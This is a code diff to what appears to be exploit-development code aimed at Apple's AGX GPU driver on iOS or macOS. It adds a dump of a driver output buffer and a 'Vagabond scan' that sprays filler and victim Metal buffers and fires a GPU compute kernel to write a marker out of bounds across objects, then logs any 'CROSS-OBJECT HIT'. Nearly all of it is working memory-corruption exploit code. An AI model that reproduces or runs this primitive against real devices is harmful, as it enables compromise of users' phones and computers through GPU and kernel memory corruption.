@@ -227,6 +227,11 @@ static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
     uint64_t obj = rd64(out + 0x10);
     L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx out10=0x%llx out18=0x%llx",
       kr, ga, sp, obj, rd64(out + 0x18));
+    // G17P: dump every nonzero qword so we can see where the real span lives
+    for (size_t o = 0; o < 0x100; o += 8) {
+        uint64_t v = rd64(out + o);
+        if (v) L(@"[AGXOUT] +0x%03zx = 0x%016llx", o, (unsigned long long)v);
+    }
     if (obj) {
         uint8_t *buf = calloc(1, 0x200);
         mach_vm_size_t sz = 0x200;
@@ -350,6 +355,44 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
 
     id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
     id<MTLCommandQueue> q = [dev newCommandQueue];
+
+    // Vagabond scan: filler+victim pairs, each victim targeted by runtime gpuAddress.
+    const uint32_t marker32 = 0x43434343u;
+    const uint32_t fill32 = 0x42424242u;
+    int hit = 0;
+    for (int k = 0; k < 24 && !hit; k++) {
+        id<MTLBuffer> filler = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> vic = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        if (!filler || !vic) break;
+        if (vic.contents) {
+            uint32_t *vp = (uint32_t *)vic.contents;
+            for (size_t o = 0; o + 4 <= 0x10000; o += 4) vp[o / 4] = fill32;
+        }
+        uint64_t vga = gpu_address(vic);
+        uint64_t d = (vga > f1ga) ? (vga - f1ga) : 0;
+        L(@"[SCAN] k=%d vic=0x%llx delta=0x%llx", k, vga, d);
+        if (vga > f1ga && d < 0x10000000) {
+            uint32_t idx = (uint32_t)(d / 4);
+            id<MTLCommandBuffer> nb = [q commandBuffer];
+            id<MTLComputeCommandEncoder> ne = [nb computeCommandEncoder];
+            [ne setComputePipelineState:pwr];
+            [ne setBuffer:f1buf offset:0 atIndex:0];
+            [ne setBytes:&idx length:4 atIndex:1];
+            [ne setBytes:(void *)&marker32 length:4 atIndex:2];
+            [ne dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [ne endEncoding];
+            [nb commit];
+            [nb waitUntilCompleted];
+            uint32_t back = 0;
+            memcpy(&back, vic.contents, 4);
+            if (back == marker32) {
+                hit = 1;
+                L(@"[SCAN] *** CROSS-OBJECT HIT k=%d delta=0x%llx ***", k, d);
+            } else {
+                L(@"[SCAN] miss k=%d idx=0x%x back=0x%08x", k, idx, back);
+            }
+        }
+    }
 
     if (delta > 0 && delta < 0x1000000) {
         uint32_t idx = (uint32_t)(delta / 4);
